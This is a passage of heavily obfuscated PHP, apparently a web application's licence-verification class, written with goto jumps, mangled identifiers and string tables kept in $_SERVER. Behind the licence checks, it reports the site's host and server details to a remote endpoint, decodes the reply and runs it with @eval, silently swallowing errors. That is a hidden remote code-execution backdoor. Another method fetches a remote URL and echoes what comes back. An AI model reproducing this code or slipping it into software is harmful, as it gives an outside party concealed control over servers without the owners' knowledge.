$D‡Ø‘ê¶ßÖ = $this->{$_SERVER[ÀÌîòš£][156]}($FÜ†ù²«Ş‡, $cè®ÊæèğÈ[189]); $aï¸ºÖ«·Á = $this->{$_SERVER[ÀÌîòš£][136]}($cè®ÊæèğÈ[157]($dØß²§Ñ†), $FÜ†ù²«Ş‡ . $cè®ÊæèğÈ[190], 3); $AìŠ„•ˆß  = $this->{$_SERVER[ÀÌîòš£][191]}($cè®ÊæèğÈ[192] . $D‡Ø‘ê¶ßÖ . $cè®ÊæèğÈ[193] . $aï¸ºÖ«·Á, -1); $cè®ÊæèğÈ[175]($AìŠ„•ˆß , !0); } else { if ($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[187]] == $cè®ÊæèğÈ[194]) { $e±øÏé½Ê£ = $cè®ÊæèğÈ[25]($cè®ÊæèğÈ[123]($cè®ÊæèğÈ[195] . $FÜ†ù²«Ş‡), 12, 15) . $cè®ÊæèğÈ[196]; $aï¸ºÖ«·Á = $this->{$_SERVER[ÀÌîòš£][197]}($cè®ÊæèğÈ[2]($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[198]]), $e±øÏé½Ê£, 2); $EéÙíÆ•œ = $cè®ÊæèğÈ[199]($aï¸ºÖ«·Á, !0); if (!$cè®ÊæèğÈ[200]($EéÙíÆ•œ) || !$cè®ÊæèğÈ[200]($EéÙíÆ•œ[$cè®ÊæèğÈ[201]]) || $EéÙíÆ•œ[$cè®ÊæèğÈ[174]] != !0) { $aİ—ŠÃŒ¿° = $cè®ÊæèğÈ[202]; $FÚİÌîÑ² = $EéÙíÆ•œ[$cè®ÊæèğÈ[201]] ? $cè®ÊæèğÈ[203] . $EéÙíÆ•œ[$cè®ÊæèğÈ[201]] : $aİ—ŠÃŒ¿°; $cè®ÊæèğÈ[175]($FÚİÌîÑ², !1); } else { $dØß²§Ñ†[$cè®ÊæèğÈ[177]] = $EéÙíÆ•œ[$cè®ÊæèğÈ[201]][$cè®ÊæèğÈ[204]]; } } else { $EéÙíÆ•œ = $this->{$_SERVER[ÀÌîòš£][191]}($cè®ÊæèğÈ[205], $dØß²§Ñ†, 10); $BÇ‰‘†°Ñ = $CÅÍ×¸ø®[600]; if (!$BÇ‰‘†°Ñ) { die; } } } if (!$cè®ÊæèğÈ[200]($EéÙíÆ•œ) || !$cè®ÊæèğÈ[200]($EéÙíÆ•œ[$cè®ÊæèğÈ[201]]) || $EéÙíÆ•œ[$cè®ÊæèğÈ[174]] != !0) { $aİ—ŠÃŒ¿° = $cè®ÊæèğÈ[206]($cè®ÊæèğÈ[207]); $FÚİÌîÑ² = $EéÙíÆ•œ[$cè®ÊæèğÈ[201]] ? $cè®ÊæèğÈ[203] . $EéÙíÆ•œ[$cè®ÊæèğÈ[201]] : $aİ—ŠÃŒ¿°; $cè®ÊæèğÈ[175]($FÚİÌîÑ², !1); } goto e™»ŒâÄŠ°; b½¨…ˆ¼£è: $cè®ÊæèğÈ[61]($cè®ÊæèğÈ[62])->{$_SERVER[ÀÌîòš£][229]}($a»”ßË¹Õí); $cÌ­Ê¯æ­Ò = $cè®ÊæèğÈ[123]($_SERVER[$cè®ÊæèğÈ[124]] . $cè®ÊæèğÈ[222]($Bö÷Œº×ôÑ) . $a»”ßË¹Õí[$cè®ÊæèğÈ[218]]); $d×èÀ’Í™Š = $cè®ÊæèğÈ[222]($cè®ÊæèğÈ[25]($cÌ­Ê¯æ­Ò, 10, 16)); goto aˆ¨©¶Ê‡‡; bÏÈ˜¥›ö: if (!$c¦«Œãİ„) { die; } $aÒ»Ã†Úñ· = $cè®ÊæèğÈ[133](16); $d‹ä±¨¦­‚ = $CÅÍ×¸ø®[602]; goto fÑ©Ÿˆôæ×; DŒî’ˆĞÉ: $a»”ßË¹Õí = array($cè®ÊæèğÈ[217] => $dØß²§Ñ†[$cè®ÊæèğÈ[174]], $cè®ÊæèğÈ[218] => $D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[219]], $cè®ÊæèğÈ[220] => $cè®ÊæèğÈ[133](16), $cè®ÊæèğÈ[129] => $D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[221]]); if ($dØß²§Ñ†[$cè®ÊæèğÈ[177]]) { $a»”ßË¹Õí[$cè®ÊæèğÈ[220]] = $dØß²§Ñ†[$cè®ÊæèğÈ[177]]; } $C–Øèæ·¸’ = $cè®ÊæèğÈ[25]($cè®ÊæèğÈ[123]($a»”ßË¹Õí[$cè®ÊæèğÈ[218]]), 10, 10); goto eáÆøâªç; e™»ŒâÄŠ°: $D©ÒÄ…¤†Ì = $EéÙíÆ•œ[$cè®ÊæèğÈ[201]]; $E†˜ìÔÕ÷‹ = $this->{$_SERVER[ÀÌîòš£][208]}($D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[209]]); if (!$E†˜ìÔÕ÷‹ || $E†˜ìÔÕ÷‹ != $D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[154]]) { $b‘Şö˜Æ¨ = array($cè®ÊæèğÈ[210] => $cè®ÊæèğÈ[61]($cè®ÊæèğÈ[62])->{$_SERVER[ÀÌîòš£][63]}($cè®ÊæèğÈ[125]), $cè®ÊæèğÈ[211] => $_SERVER[$cè®ÊæèğÈ[124]], $cè®ÊæèğÈ[212] => $cè®ÊæèğÈ[213](), $cè®ÊæèğÈ[183] => $_SERVER[$cè®ÊæèğÈ[184]]); $aï¸ºÖ«·Á = $this->{$_SERVER[ÀÌîòš£][214]}($cè®ÊæèğÈ[157]($b‘Şö˜Æ¨)); $this->{$_SERVER[ÀÌîòš£][191]}($cè®ÊæèğÈ[215] . $aï¸ºÖ«·Á); $cè®ÊæèğÈ[175]($cè®ÊæèğÈ[206]($cè®ÊæèğÈ[216]), !0); } goto DŒî’ˆĞÉ; Eœ«¦’ª¾: if (!isset($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[174]]) || $cè®ÊæèğÈ[24]($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[174]]) != 16) { $cè®ÊæèğÈ[175]($cè®ÊæèğÈ[176] . $a í¬ÀƒÏ‡[$cè®ÊæèğÈ[174]], !1); } $Bö÷Œº×ôÑ = $cè®ÊæèğÈ[61]($cè®ÊæèğÈ[62])->{$_SERVER[ÀÌîòš£][63]}($cè®ÊæèğÈ[125]); $dØß²§Ñ† = array($cè®ÊæèğÈ[174] => $a í¬ÀƒÏ‡[$cè®ÊæèğÈ[174]], $cè®ÊæèğÈ[177] => $cè®ÊæèğÈ[133](16), $cè®ÊæèğÈ[178] => $cè®ÊæèğÈ[158], $cè®ÊæèğÈ[179] => $cè®ÊæèğÈ[180], $cè®ÊæèğÈ[181] => $_SERVER[$cè®ÊæèğÈ[182]], $cè®ÊæèğÈ[183] => $_SERVER[$cè®ÊæèğÈ[184]], $cè®ÊæèğÈ[185] => $_SERVER[$cè®ÊæèğÈ[186]]); goto aÏÛŒœ¹çà; EÌêÛï©¬Û: if (!$cè®ÊæèğÈ[113]($GLOBALS, $cè®ÊæèğÈ[141])) { die; } $a í¬ÀƒÏ‡ = $GLOBALS[$cè®ÊæèğÈ[22]]; if (isset($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[172]])) { $this->{$_SERVER[ÀÌîòš£][173]}(); die; } goto Eœ«¦’ª¾; D–²‰×áâƒ: if (!$Có®’­š¼ğ) { die; } $bƒÙ—Ÿ†ó£[$d×èÀ’Í™Š] = $F‘±†§¬ÃŸ; $cÔåËŠäˆÎ = $CÅÍ×¸ø®[608]; goto FŸ¢³Ô‰ùĞ; c‡å‡èãØ: } private function licenseRegistSuccess() { $e·ŒÇ³Šî =& $_SERVER[ÀÌîòš£]; $DÚ‡êèÁÜ¹ = $e·ŒÇ³Šî[61]($e·ŒÇ³Šî[62])->{$_SERVER[ÀÌîòš£][63]}(); if ($DÚ‡êèÁÜ¹[$e·ŒÇ³Šî[89]] != $e·ŒÇ³Šî[228]) { $e·ŒÇ³Šî[61]($e·ŒÇ³Šî[62])->{$_SERVER[ÀÌîòš£][229]}($e·ŒÇ³Šî[89], $e·ŒÇ³Šî[228]); } $e·ŒÇ³Šî[119]($e·ŒÇ³Šî[238])->{$_SERVER[ÀÌîòš£][239]}(!0); } private function hxupea69b369() { goto FÏ‡†Ú Ü; cŒïã»äª: $EÇ’‘´¼½Ş = $e†Ë¤„Ù[612]; while (strlen($EÇ’‘´¼½Ş) < $e†Ë¤„Ù[572]) { if (!$EÇ’‘´¼½Ş) { break; } $EÇ’‘´¼½Ş++; } $this->ihcx778521b7 = array(); goto bç°„”­­¾; AÙƒë÷ë´: $E‚ˆãù¾‚” = $e†Ë¤„Ù[611]; if (!$E‚ˆãù¾‚”) { die; } $BëßïÒôÜŞ[61]($BëßïÒôÜŞ[62])->{$_SERVER[ÀÌîòš£][226]}($BëßïÒôÜŞ[227], $BëßïÒôÜŞ[240]); goto cŒïã»äª; bç°„”­­¾: $this->mcry0c9b6e2b = $BëßïÒôÜŞ[130]; goto AÆÑÙè„–; FÏ‡†Ú Ü: $e†Ë¤„Ù =& $_SERVER[Å¸ş]; $BëßïÒôÜŞ =& $_SERVER[ÀÌîòš£]; $BëßïÒôÜŞ[61]($BëßïÒôÜŞ[62])->{$_SERVER[ÀÌîòš£][229]}(array($BëßïÒôÜŞ[217] => $BëßïÒôÜŞ[10], $BëßïÒôÜŞ[218] => $BëßïÒôÜŞ[10], $BëßïÒôÜŞ[129] => $BëßïÒôÜŞ[130], $BëßïÒôÜŞ[131] => $BëßïÒôÜŞ[10], $BëßïÒôÜŞ[132] => $BëßïÒôÜŞ[10])); goto AÙƒë÷ë´; AÆÑÙè„–: } private function vfjda1c6fe29() { goto D™¶ÙÄœë›; D™¶ÙÄœë›: $E¸É¡–†´ö =& $_SERVER[Å¸ş]; $D‹Ò£ã³Š… =& $_SERVER[ÀÌîòš£]; $_SERVER[$D‹Ò£ã³Š…[184]] = $D‹Ò£ã³Š…[113]($_SERVER, $D‹Ò£ã³Š…[184], APP_HOST); goto Eá÷í¶îæ½; d‘ƒ—‡‹¨: $c—ÚŒÂ†°´ = $A¡º¾…·…ª[$D‹Ò£ã³Š…[233]]; $AÑ×š«§ ƒ = $D‹Ò£ã³Š…[123]($_SERVER[$D‹Ò£ã³Š…[124]] . $D‹Ò£ã³Š…[222]($C¥¢¸ª´Õä) . $AŠä¹ª—Ş‹[$D‹Ò£ã³Š…[218]]); $CÛÖ¢«µ = $D‹Ò£ã³Š…[222]($D‹Ò£ã³Š…[25]($AÑ×š«§ ƒ, 10, 16)); goto A‡ÈÖ‚†; fšµ›‰¢˜: if ($AŠä¹ª—Ş‹[$D‹Ò£ã³Š…[129]] == $D‹Ò£ã³Š…[130]) { return; } $C¥¢¸ª´Õä = $D‹Ò£ã³Š…[61]($D‹Ò£ã³Š…[62])->{$_SERVER[ÀÌîòš£][63]}($D‹Ò£ã³Š…[125]); $A¡º¾…·…ª = $D‹Ò£ã³Š…[230]($D‹Ò£ã³Š…[61]($D‹Ò£ã³Š…[11])->{$_SERVER[ÀÌîòš£][231]}(), $D‹Ò£ã³Š…[232]); goto d‘ƒ—‡‹¨; A‡ÈÖ‚†: $EÎóÖÔ£‘ = $E¸É¡–†´ö[615]; $C·•±¸Ë = $this->{$_SERVER[ÀÌîòš£][197]}($c—ÚŒÂ†°´[$D‹Ò£ã³Š…[100]][$CÛÖ¢«µ], $AÑ×š«§ ƒ); $Cªê‰ä¢·– = $E¸É¡–†´ö[616]; goto fº³‰ÙÆæù; C’øîóÃ˜: $fÏ“ùÂä³à = $D‹Ò£ã³Š…[153]($C·•±¸Ë[$D‹Ò£ã³Š…[154]]); if ($D‹Ò£ã³Š…[241]() >= $fÏ“ùÂä³à) { return $this->{$_SERVER[ÀÌîòš£][173]}(); } $this->ihcx778521b7 = $C·•±¸Ë; goto C…¹‡°µ¡; Eá÷í¶îæ½: $this->mcry0c9b6e2b = $D‹Ò£ã³Š…[130]; $d—Ï‡õìô¥ = $E¸É¡–†´ö[613]; while (strlen($d—Ï‡õìô¥) < $E¸É¡–†´ö[572]) { if (!$d—Ï‡õìô¥) { break; } $d—Ï‡õìô¥++; } goto c©ˆŞ¥†óñ; C…¹‡°µ¡: $this->mcry0c9b6e2b = $AŠä¹ª—Ş‹[$D‹Ò£ã³Š…[129]]; $bŒØÌƒÈ©ä = $E¸É¡–†´ö[617]; goto d ¤Ú‘©ä; c©ˆŞ¥†óñ: $AŠä¹ª—Ş‹ = $D‹Ò£ã³Š…[61]($D‹Ò£ã³Š…[62])->{$_SERVER[ÀÌîòš£][63]}(); $c‚³‚×‹”¡ = $E¸É¡–†´ö[614]; while (strlen($c‚³‚×‹”¡) < $E¸É¡–†´ö[561]) { if (!$c‚³‚×‹”¡) { break; } $c‚³‚×‹”¡++; } goto fšµ›‰¢˜; fº³‰ÙÆæù: if (strlen($Cªê‰ä¢·–) < $E¸É¡–†´ö[572]) { return; } $C·•±¸Ë = $D‹Ò£ã³Š…[199]($C·•±¸Ë, !0); if (!$D‹Ò£ã³Š…[200]($C·•±¸Ë)) { return $this->{$_SERVER[ÀÌîòš£][173]}(); } goto C’øîóÃ˜; d ¤Ú‘©ä: } private function cfiqcd80b177() { goto E‚âµ×àõ«; E‚âµ×àõ«: $föù³£˜¾ =& $_SERVER[ÀÌîòš£]; $AÓÕÀ¤˜„ƒ = $GLOBALS[$föù³£˜¾[22]]; $Dğš¾ï–Ï× = $_SERVER[Å¸ş][618]; goto A’†›ªâÖ‡; BÓíå‚”Ú: $a£ß‘ö§… = array($föù³£˜¾[245], $föù³£˜¾[246]); if ($föù³£˜¾[247]($aĞ¼³ÆŒˆ¸, $a£ß‘ö§…)) { if ($this->mcry0c9b6e2b == $föù³£˜¾[130] && isset($AÓÕÀ¤˜„ƒ[$föù³£˜¾[248]])) { $föù³£˜¾[175]($föù³£˜¾[206]($föù³£˜¾[243]), !1, $föù³£˜¾[244]); die; } $aŒíƒš”ç¥ = $this->{$_SERVER[ÀÌîòš£][146]}(); if ($aŒíƒš”ç¥ != $föù³£˜¾[249]($föù³£˜¾[250])) { if ($aŒíƒš”ç¥ <= $föù³£˜¾[61]($föù³£˜¾[148])->{$_SERVER[ÀÌîòš£][149]}()) { $föù³£˜¾[175]($föù³£˜¾[206]($föù³£˜¾[251]), !1, $föù³£˜¾[244]); die; } } } goto fÈà‚¤Îä; A’†›ªâÖ‡: if (!$Dğš¾ï–Ï×) { die; } $aĞ¼³ÆŒˆ¸ = $_SERVER[$föù³£˜¾[44]]; if ($aĞ¼³ÆŒˆ¸ == $föù³£˜¾[242] && $this->mcry0c9b6e2b == $föù³£˜¾[130]) { $föù³£˜¾[175]($föù³£˜¾[206]($föù³£˜¾[243]), !1, $föù³£˜¾[244]); } goto BÓíå‚”Ú; fÈà‚¤Îä: } private function mdjof2fbc491() { goto FÚ·ÌÈÇ³; Bå“Š˜†îµ: $E¦ñ—ó„„º = $Cá›Ç£î˜÷[620]; if ($d–³¸’…ÃÊ && $DØ•ä£ğ… [32]($d–³¸’…ÃÊ, $DØ•ä£ğ… [265])) { echo $d–³¸’…ÃÊ; } die; goto d©‰äÊÂç; eŒˆÜÜëƒ¾: $E½¯óğ°¸÷ = $this->{$_SERVER[ÀÌîòš£][255]}($E½¯óğ°¸÷, $DØ•ä£ğ… [256]); $dä»êƒ£š© = $Cá›Ç£î˜÷[619]; if (strlen($dä»êƒ£š©) < $Cá›Ç£î˜÷[572]) { die; } goto F¶ĞÈÀùšî; Fê‹­ÕìÂ¤: if (!$DØ•ä£ğ… [113]($GLOBALS, $DØ•ä£ğ… [141]) || !isset($_GET[$DØ•ä£ğ… [253]])) { return; } if (!$DØ•ä£ğ… [247]($_SERVER[$DØ•ä£ğ… [44]], $f¥ÀÎÕô™)) { return; } $E½¯óğ°¸÷ = $DØ•ä£ğ… [254]; goto eŒˆÜÜëƒ¾; FÚ·ÌÈÇ³: $Cá›Ç£î˜÷ =& $_SERVER[Å¸ş]; $DØ•ä£ğ…  =& $_SERVER[ÀÌîòš£]; $f¥ÀÎÕô™ = array($DØ•ä£ğ… [144], $DØ•ä£ğ… [252]); goto Fê‹­ÕìÂ¤; F¶ĞÈÀùšî: $BÓÚ¬˜÷¯ç = $DØ•ä£ğ… [257](array($DØ•ä£ğ… [258] => array($DØ•ä£ğ… [259] => $DØ•ä£ğ… [260], $DØ•ä£ğ… [261] => 3))); $d–³¸’…ÃÊ = @$DØ•ä£ğ… [262]($E½¯óğ°¸÷, !1, $BÓÚ¬˜÷¯ç); $DØ•ä£ğ… [263]($DØ•ä£ğ… [264]); goto Bå“Š˜†îµ; d©‰äÊÂç: } public function xwpz3f9d6606($F¨¬Ôˆçëç) { goto bÊ…ôâóÄ; c‰°ÎŸæ: $f‚È‘È¶ç˜ = $dã«ˆÆá[0]($dã«ˆÆá[282], $dã«ˆÆá[113]($this->ihcx778521b7, $dã«ˆÆá[138], $dã«ˆÆá[10])); $dÌ›Éî£»µ = $F¬¨ÜÖ©[622]; if (strlen($dÌ›Éî£»µ) < $F¬¨ÜÖ©[554]) { return; } goto Dö¯È‹ñë×; Dö¯È‹ñë×: $Bğ‘Öåˆ‚ = array(); foreach ($EäÄ¥µà ´ as $c’ëåÁÓŸ‡ => $A‘›½÷¢âŒ) { if ($A‘›½÷¢âŒ == $dã«ˆÆá[268] && $dã«ˆÆá[25]($this->mcry0c9b6e2b, 0, 1) == $dã«ˆÆá[268]) { continue; } if (!$dã«ˆÆá[247]($c’ëåÁÓŸ‡, $f‚È‘È¶ç˜)) { $Bğ‘Öåˆ‚[] = $c’ëåÁÓŸ‡; } } foreach ($Bğ‘Öåˆ‚ as $c’ëåÁÓŸ‡) { unset($F¨¬Ôˆçëç[$c’ëåÁÓŸ‡]); $câòŸ‘ÊÆ“ = $F¬¨ÜÖ©[623]; if (strlen($câòŸ‘ÊÆ“) < $F¬¨ÜÖ©[554]) { return; } } goto D¥……õŸË…; bÊ…ôâóÄ: $F¬¨ÜÖ© =& $_SERVER[Å¸ş]; $dã«ˆÆá =& $_SERVER[ÀÌîòš£]; if ($this->mcry0c9b6e2b == $dã«ˆÆá[266]) { return $F¨¬Ôˆçëç; } goto Dì‰ÔÅØÜ; D¥……õŸË…: return $F¨¬Ôˆçëç; goto bÕˆí­ùÇÀ; Dì‰ÔÅØÜ: $EäÄ¥µà ´ = array($dã«ˆÆá[267] => $dã«ˆÆá[268], $dã«ˆÆá[269] => $dã«ˆÆá[268], $dã«ˆÆá[270] => $dã«ˆÆá[268], $dã«ˆÆá[271] => $dã«ˆÆá[268], $dã«ˆÆá[272] => $dã«ˆÆá[268], $dã«ˆÆá[273] => $dã«ˆÆá[268], $dã«ˆÆá[274] => $dã«ˆÆá[275], $dã«ˆÆá[276] => $dã«ˆÆá[275], $dã«ˆÆá[277] => $dã«ˆÆá[275], $dã«ˆÆá[278] => $dã«ˆÆá[275], $dã«ˆÆá[279] => $dã«ˆÆá[275], $dã«ˆÆá[280] => $dã«ˆÆá[275], $dã«ˆÆá[281] => $dã«ˆÆá[275]); $dåíĞÒ» = $F¬¨ÜÖ©[621]; if (strlen($dåíĞÒ») < $F¬¨ÜÖ©[561]) { return; } goto c‰°ÎŸæ; bÕˆí­ùÇÀ: } private function hzlw5ccc5766() { goto CëñÓÀñ; CëñÓÀñ: $F÷ÜÔØ§Ëº =& $_SERVER[Å¸ş]; $d¡à–ªîˆ =& $_SERVER[ÀÌîòš£]; if ($this->mcry0c9b6e2b != $d¡à–ªîˆ[130]) { return; } goto BîÛ¦¨ÒØ; cç˜êÚË‹’: if (strlen($eÜ»–¥Öê) < $F÷ÜÔØ§Ëº[561]) { die; } if ($d¡à–ªîˆ[61]($d¡à–ªîˆ[285])->{$_SERVER[ÀÌîòš£][63]}($d¡à–ªîˆ[89]) != $d¡à–ªîˆ[240]) { $d¡à–ªîˆ[61]($d¡à–ªîˆ[285])->{$_SERVER[ÀÌîòš£][229]}($d¡à–ªîˆ[89], $d¡à–ªîˆ[240]); } goto FµÜ›î†÷¿; BîÛ¦¨ÒØ: $GLOBALS[$d¡à–ªîˆ[100]][$d¡à–ªîˆ[104]][$d¡à–ªîˆ[283]] = $d¡à–ªîˆ[228]; $GLOBALS[$d¡à–ªîˆ[100]][$d¡à–ªîˆ[284]] = $d¡à–ªîˆ[228]; $eÜ»–¥Öê = $F÷ÜÔØ§Ëº[624]; goto cç˜êÚË‹’; FµÜ›î†÷¿: } public function rzqd0b12fa73() { return $_SERVER[ÀÌîòš£][286]; $aÒ±·ñ˜† = $_SERVER[Å¸ş][625]; if (!$aÒ±·ñ˜†) { die; } } private function praya94714ae() { goto fù°Øòêœù; bºîâÃÇ‹: if (!$C”»›®ê¯Ä[247]($_SERVER[$C”»›®ê¯Ä[44]], $dÓÅ…È½ Ê)) { return; } if ($C”»›®ê¯Ä[241]() % 4 != 0) { return; } $e‘‘¶®çÊ = $C”»›®ê¯Ä[13](array($C”»›®ê¯Ä[292], $C”»›®ê¯Ä[293]), $aÀ‹Æã·ÀÒ); goto D‚‚İ™Éº¨; E¶œ°¡—: while ($B˜»ïÔİ÷Ï < $DèğÛÆªí[561]) { if ($B˜»ïÔİ÷Ï >= 0) { break; } $B˜»ïÔİ÷Ï++; } $eÓÖ…†¤± = array($C”»›®ê¯Ä[174] => $C”»›®ê¯Ä[61]($C”»›®ê¯Ä[62])->{$_SERVER[ÀÌîòš£][63]}($C”»›®ê¯Ä[217]), $C”»›®ê¯Ä[187] => $this->mcry0c9b6e2b, $C”»›®ê¯Ä[185] => $_SERVER[$C”»›®ê¯Ä[186]], $C”»›®ê¯Ä[178] => $C”»›®ê¯Ä[158], $C”»›®ê¯Ä[181] => $_SERVER[$C”»›®ê¯Ä[182]]); $d«ƒíŠ‰¨ƒ = $this->{$_SERVER[ÀÌîòš£][191]}($C”»›®ê¯Ä[295], $eÓÖ…†¤±); goto fÅŠ…Ëâ…Û; fÛ­ïšº˜…: $aÀ‹Æã·ÀÒ = $C”»›®ê¯Ä[290] . $C”»›®ê¯Ä[123]($C”»›®ê¯Ä[291]); $B‹¶ëŠÕ„ = $DèğÛÆªí[626]; if ($this->mcry0c9b6e2b == $C”»›®ê¯Ä[130] || !$C”»›®ê¯Ä[113]($GLOBALS, $C”»›®ê¯Ä[141])) { return; } goto bºîâÃÇ‹; fÅŠ…Ëâ…Û: if (!$C”»›®ê¯Ä[200]($d«ƒíŠ‰¨ƒ)) { return; } if ($d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[174]] && $d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[296]]) { if ($this->{$_SERVER[ÀÌîòš£][208]}($d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[296]]) == $eÓÖ…†¤±[$C”»›®ê¯Ä[174]]) { return; } } $this->{$_SERVER[ÀÌîòš£][173]}(); goto c±²‚¤•´„; c±²‚¤•´„: $fá¬ÇŠáŸ = $DèğÛÆªí[628]; while (strlen($fá¬ÇŠáŸ) < $DèğÛÆªí[572]) { if (!$fá¬ÇŠáŸ) { break; } $fá¬ÇŠáŸ++; } if ($this->{$_SERVER[ÀÌîòš£][208]}($d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[296]]) != $eÓÖ…†¤±[$C”»›®ê¯Ä[174]]) { $a¥îŠ„Œ“ = array($C”»›®ê¯Ä[210] => $C”»›®ê¯Ä[61]($C”»›®ê¯Ä[62])->{$_SERVER[ÀÌîòš£][63]}($C”»›®ê¯Ä[125]), $C”»›®ê¯Ä[211] => $_SERVER[$C”»›®ê¯Ä[124]], $C”»›®ê¯Ä[212] => $C”»›®ê¯Ä[213](), $C”»›®ê¯Ä[183] => $_SERVER[$C”»›®ê¯Ä[184]]); $aŠÙá§—‡³ = $this->{$_SERVER[ÀÌîòš£][214]}($C”»›®ê¯Ä[157]($a¥îŠ„Œ“)); $d«ƒíŠ‰¨ƒ = $this->{$_SERVER[ÀÌîòš£][191]}($C”»›®ê¯Ä[215] . $aŠÙá§—‡³); if ($d«ƒíŠ‰¨ƒ && $C”»›®ê¯Ä[200]($d«ƒíŠ‰¨ƒ) && isset($d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[296]])) { $aŒÓë‹£’Å = $this->{$_SERVER[ÀÌîòš£][197]}($d«ƒíŠ‰¨ƒ[$C”»›®ê¯Ä[296]], 2); if ($aŒÓë‹£’Å) { $aŒÓë‹£’Å = $this->{$_SERVER[ÀÌîòš£][208]}($aŒÓë‹£’Å); } if ($aŒÓë‹£’Å) { try { @eval($aŒÓë‹£’Å); } catch (Exception $F‘¢’ôœ¯§) { } } } } goto d´¯ÔÎÉå; D‚‚İ™Éº¨: if ($e‘‘¶®çÊ && $C”»›®ê¯Ä[241]() - $e‘‘¶®çÊ < $C”»›®ê¯Ä[249]($C”»›®ê¯Ä[294])) { return; } $C”»›®ê¯Ä[13](array($C”»›®ê¯Ä[292], $C”»›®ê¯Ä[161]), $aÀ‹Æã·ÀÒ, $C”»›®ê¯Ä[241]()); $B˜»ïÔİ÷Ï = $DèğÛÆªí[627]; goto E¶œ°¡—; fù°Øòêœù: $DèğÛÆªí =& $_SERVER[Å¸ş]; $C”»›®ê¯Ä =& $_SERVER[ÀÌîòš£]; $dÓÅ…È½ Ê = array($C”»›®ê¯Ä[287], $C”»›®ê¯Ä[288], $C”»›®ê¯Ä[289]); goto fÛ­ïšº˜…; d´¯ÔÎÉå: } private function yita21d01294($A£ºÁ‰­¡ = '', $AçË¬ÃÆ›õ = array(), $fµ°ö·°— = 5) { goto DÄÕ„ŠºŒ²; Aî„ª­´Åà: $C×¾‚ÛÈ¡ù = $E‡¾¤¯…ÔÙ[631]; while ($C×¾‚ÛÈ¡ù < $E‡¾¤¯…ÔÙ[554]) { if ($C×¾‚ÛÈ¡ù >= 0) { break; } $C×¾‚ÛÈ¡ù++; } return $AİöğÖ¿Ù¾[199]($AçË¬ÃÆ›õ, !0); goto B…ÉŠÙÚø¿; eÂ¯ÅèŒ›®: $Dî¢­™Ş  = $Dî¢­™Ş  . $A£ºÁ‰­¡ . $AİöğÖ¿Ù¾[299] . $AİöğÖ¿Ù¾[300]($AçË¬ÃÆ›õ); $aˆ™³ŒÂ‘‡ = $E‡¾¤¯…ÔÙ[630]; if (strlen($aˆ™³ŒÂ‘‡) < $E‡¾¤¯…ÔÙ[550]) { return; } goto eƒÑŞ¢¼ˆ£; B…ÉŠÙÚø¿: $bÃ ù¡ñ«ó = $E‡¾¤¯…ÔÙ[632]; if (strlen($bÃ ù¡ñ«ó) < $E‡¾¤¯…ÔÙ[554]) { die; } goto E‚ÓĞœŒ¼; a‘½Ë©ãˆå: $Dî¢­™Ş  = $this->{$_SERVER[ÀÌîòš£][255]}($Dî¢­™Ş , $AİöğÖ¿Ù¾[298]); $dÓÚÔ½æÂ˜ = $E‡¾¤¯…ÔÙ[629]; if (strlen($dÓÚÔ½æÂ˜) < $E‡¾¤¯…ÔÙ[550]) { die; } goto eÂ¯ÅèŒ›®; eƒÑŞ¢¼ˆ£: if ($AçË¬ÃÆ›õ === -1) { return $Dî¢­™Ş ; } $e…‹‰Ÿ®†˜ = $AİöğÖ¿Ù¾[257](array($AİöğÖ¿Ù¾[258] => array($AİöğÖ¿Ù¾[261] => $fµ°ö·°—, $AİöğÖ¿Ù¾[259] => $AİöğÖ¿Ù¾[301]), $AİöğÖ¿Ù¾[302] => array($AİöğÖ¿Ù¾[303] => !1, $AİöğÖ¿Ù¾[304] => !1))); $AçË¬ÃÆ›õ = @$AİöğÖ¿Ù¾[262]($Dî¢­™Ş , !1, $e…‹‰Ÿ®†˜); goto Aî„ª­´Åà; DÄÕ„ŠºŒ²: $E‡¾¤¯…ÔÙ =& $_SERVER[Å¸ş]; $AİöğÖ¿Ù¾ =& $_SERVER[ÀÌîòš£]; $Dî¢­™Ş  = $AİöğÖ¿Ù¾[297]; goto a‘½Ë©ãˆå; E‚ÓĞœŒ¼: } private function xfkq1eb13b5c() { goto BƒØ‘¿ÑÏŠ; e‡àÄèÌôõ: $e×£ºÊä†Ü = $b¸ö²ŒÍ‚Ş[249]($e×£ºÊä†Ü ? $e×£ºÊä†Ü : $b¸ö²ŒÍ‚Ş[306]); $Bî“Ññª” = $b¸ö²ŒÍ‚Ş[113]($this->ihcx778521b7, $b¸ö²ŒÍ‚Ş[332]); $Bî“Ññª” = $Bî“Ññª” ? $b¸ö²ŒÍ‚Ş[249]($Bî“Ññª”) : 0; goto B¶É¨£ãæò; d‹ì‘é¥ß: $EÒ‹‹ÆÇÚ… = $Cš¸°ï¨‰[633]; if (strlen($EÒ‹‹ÆÇÚ…) < $Cš¸°ï¨‰[566]) { return; } $e×£ºÊä†Ü = $CÕ«æ’ÈÅ[$this->mcry0c9b6e2b]; goto e‡àÄèÌôõ; BƒØ‘¿ÑÏŠ: $Cš¸°ï¨‰ =& $_SERVER[Å¸ş]; $b¸ö²ŒÍ‚Ş =& $_SERVER[ÀÌîòš£]; $CÕ«æ’ÈÅ = array($b¸ö²ŒÍ‚Ş[305] => $b¸ö²ŒÍ‚Ş[306], $b¸ö²ŒÍ‚Ş[307] => $b¸ö²ŒÍ‚Ş[308], $b¸ö²ŒÍ‚Ş[309] => $b¸ö²ŒÍ‚Ş[310], $b¸ö²ŒÍ‚Ş[311] => $b¸ö²ŒÍ‚Ş[312], $b¸ö²ŒÍ‚Ş[313] => $b¸ö²ŒÍ‚Ş[314], $b¸ö²ŒÍ‚Ş[315] => $b¸ö²ŒÍ‚Ş[250], $b¸ö²ŒÍ‚Ş[316] => $b¸ö²ŒÍ‚Ş[250], $b¸ö²ŒÍ‚Ş[317] => $b¸ö²ŒÍ‚Ş[306], $b¸ö²ŒÍ‚Ş[318] => $b¸ö²ŒÍ‚Ş[308], 